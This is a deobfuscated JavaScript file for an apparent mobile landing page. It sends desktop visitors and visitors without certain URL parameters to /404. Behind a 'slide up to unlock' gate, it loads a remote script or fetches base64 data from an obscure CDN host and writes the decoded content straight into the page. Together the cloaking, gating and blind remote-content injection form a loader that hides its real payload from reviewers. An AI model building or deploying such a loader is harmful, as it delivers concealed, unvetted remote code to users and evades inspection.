//Tue Oct 14 2025 14:04:45 GMT+0000 (Coordinated Universal Time)
//Base:https://github.com/echo094/decode-js
//Modify:https://github.com/smallfawn/decode_action
!window.location.href.includes(",") && !getVideoid("t") && !getVideoid("s") && (location.href = "/404");
(!/Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent) || /^(Win|Mac)/i.test(navigator.platform)) && (location.href = "/404");
document.body.backgroundColor = "#f5f9ff";
const sliderContainer = document.createElement("div");
sliderContainer.className = "slider-container";
const sliderTrack = document.createElement("div");
sliderTrack.className = "slider-track";
sliderTrack.id = "sliderTrack";
const sliderProgress = document.createElement("div");
sliderProgress.className = "slider-progress";
sliderProgress.id = "sliderProgress";
const sliderThumb = document.createElement("div");
sliderThumb.className = "slider-thumb";
sliderThumb.id = "sliderThumb";
const unlockHint = document.createElement("div");
unlockHint.className = "unlock-hint";
unlockHint.id = "unlockHint";
sliderTrack.appendChild(sliderProgress);
sliderTrack.appendChild(sliderThumb);
sliderContainer.appendChild(sliderTrack);
sliderContainer.appendChild(unlockHint);
document.body.appendChild(sliderContainer);
unlockHint.innerHTML = "&#x8bf7;&#x5411;&#x4e0a;&#x6ed1;&#x52a8;&#x5706;&#x5f62;&#x6ed1;&#x5757;";
let isDragging = false,
  trackRect = sliderTrack.getBoundingClientRect(),
  maxDistance = trackRect.height - 48;
function updateTrackSize() {
  trackRect = sliderTrack.getBoundingClientRect();
  maxDistance = trackRect.height - 48;
}
window.addEventListener("resize", updateTrackSize);
sliderThumb.addEventListener("mousedown", startDrag);
sliderThumb.addEventListener("touchstart", startDrag);
function startDrag(lIlI1I) {
  sliderThumb.style.animation = "none";
  isDragging = true;
  sliderThumb.classList.add("active");
  createWave();
  document.addEventListener("mousemove", onDrag);
  document.addEventListener("touchmove", onDrag);
  document.addEventListener("mouseup", endDrag);
  document.addEventListener("touchend", endDrag);
}
function onDrag(Ii1iIlII) {
  if (!isDragging) return;
  const ilil1ii = Ii1iIlII.clientY || Ii1iIlII.touches[0].clientY;
  let llI1lII1 = trackRect.bottom - ilil1ii - 24;
  llI1lII1 = Math.max(0, Math.min(llI1lII1, maxDistance));
  sliderThumb.style.bottom = llI1lII1 + "px";
  sliderProgress.style.height = llI1lII1 + "px";
  const iiIlI1ii = llI1lII1 / maxDistance * 100;
  iiIlI1ii > 70 ? (unlockHint.innerHTML = "&#x91ca;&#x653e;&#x540e;&#x52a0;&#x8f7d;", unlockHint.style.color = "#4a89dc") : (unlockHint.innerHTML = "&#x7ee7;&#x7eed;&#x5411;&#x4e0a;&#x6ed1;&#x52a8;", unlockHint.style.color = "#7fa8eb");
}
function endDrag() {
  isDragging = false;
  sliderThumb.classList.remove("active");
  document.removeEventListener("mousemove", onDrag);
  document.removeEventListener("touchmove", onDrag);
  document.removeEventListener("mouseup", endDrag);
  document.removeEventListener("touchend", endDrag);
  checkUnlock();
}
function checkUnlock() {
  const l1ilill1 = parseFloat(sliderThumb.style.bottom) || 0,
    Ili1I111 = l1ilill1 / maxDistance * 100;
  Ili1I111 >= 95 ? unlockSuccess() : resetSlider();
}
function unlockSuccess() {
  sliderProgress.style.height = maxDistance + "px";
  sliderThumb.style.bottom = maxDistance + "px";
  unlockHint.innerHTML = "&#x6b63;&#x5728;&#x524d;&#x5f80;...";
  createConfetti();
  if (navigator.vibrate) navigator.vibrate(100);
  const ll1IIlli = getVideoid("flag");
  if (ll1IIlli == 1) setTimeout(function () {
    var l11Il11i = st("nt", st("nt") + 1, 4);
    if (l11Il11i < 3) {
      location.reload();
    } else loadaaa();
  }, 500);else {
    if (ll1IIlli == 3) {
      var llii11lI = document.createElement("script");
      llii11lI.src = "https://ce9e386c79c8eac7.cdn.jiashule.com/cdn/qq.js?v=0630";
      document.head.appendChild(llii11lI);
      llii11lI.onload = function () {
        typeof callQQback === "function" && callQQback();
      };
    } else loadaaa();
  }
}
function resetSlider() {
  sliderThumb.style.transition = "bottom 0.5s cubic-bezier(0.175, 0.885, 0.32, 1.5)";
  sliderProgress.style.transition = "height 0.5s ease";
  sliderThumb.style.bottom = "0";
  sliderProgress.style.height = "0";
  unlockHint.innerHTML = "&#x8bf7;&#x5411;&#x4e0a;&#x6ed1;&#x52a8;&#x5706;&#x5f62;&#x6ed1;&#x5757;";
  unlockHint.style.color = "#7fa8eb";
  setTimeout(() => {
    sliderThumb.style.transition = "none";
    sliderProgress.style.transition = "none";
  }, 500);
  sliderThumb.style.animation = "idlePulse 2s infinite ease-in-out";
}
function createWave() {
  const i1ll1lI1 = document.createElement("div");
  i1ll1lI1.classList.add("wave", "active");
  sliderThumb.appendChild(i1ll1lI1);
  setTimeout(() => i1ll1lI1.remove(), 600);
}
function createConfetti() {
  for (let IiI1ilI = 0; IiI1ilI < 15; IiI1ilI++) {
    const il1li11I = document.createElement("div");
    il1li11I.classList.add("confetti");
    const liIi1i = Math.random() * Math.PI * 2,
      i1liIi1I = 50 + Math.random() * 50;
    il1li11I.style.setProperty("--tx", Math.cos(liIi1i) * i1liIi1I + "px");
    il1li11I.style.setProperty("--ty", Math.sin(liIi1i) * i1liIi1I + "px");
    il1li11I.style.left = Math.random() * 100 + "%";
    il1li11I.style.top = Math.random() * 100 + "%";
    il1li11I.style.background = "hsl(" + (Math.random() * 60 + 180) + ", 80%, 60%)";
    il1li11I.style.animationDelay = Math.random() * 0.3 + "s";
    document.body.appendChild(il1li11I);
    setTimeout(() => il1li11I.remove(), 1000);
  }
}
function getVideoid(IIll1ll) {
  (function () {})();
  var l11iII1I = window.location.hash.substring(1) || window.location.search.substring(1),
    l1I11III = l11iII1I.split("&");
  for (var iiIlllIi = 0; iiIlllIi < l1I11III.length; iiIlllIi++) {
    var II11lIll = l1I11III[iiIlllIi].split("=");
    if (II11lIll[0] == IIll1ll) return II11lIll[1];
  }
  return false;
}
function st(iil1IlII, IlIii1, iil1iliI) {
  var iIIiIlI1,
    I1i1Ii = Math.floor(new Date() / 1000),
    lIIl11lI = JSON.parse(localStorage.csc || "{}");
  for (iIIiIlI1 in lIIl11lI) if (lIIl11lI[iIIiIlI1][1] && lIIl11lI[iIIiIlI1][1] < I1i1Ii) delete lIIl11lI[iIIiIlI1];
  if (IlIii1 === null) {
    delete lIIl11lI[iil1IlII];
  } else {
    if (IlIii1 === undefined) return lIIl11lI[iil1IlII] && lIIl11lI[iil1IlII][1] > I1i1Ii ? lIIl11lI[iil1IlII][0] : 0;else lIIl11lI[iil1IlII] = [IlIii1, I1i1Ii + (iil1iliI || 3000000)];
  }
  return localStorage.csc = JSON.stringify(lIIl11lI), IlIii1;
}
function loadaaa() {
  const liIIi1II = getVideoid("t") ? "t=" + getVideoid("t") : "s=" + getVideoid("s");
  fetch("https://ce9e386c79c8eac7.cdn.jiashule.com/cdn/get.js?" + liIIi1II).then(ili1iil => ili1iil.json()).then(liIiiIi => {
    if (liIiiIi.code == 200) {
      const Ii1Il1Il = decodeURIComponent(window.atob(liIiiIi.data));
      document.write(Ii1Il1Il);
    } else return;
  }).catch(I1i1i => {
    unlockHint.textContent = "网络错误";
  });
}
updateTrackSize();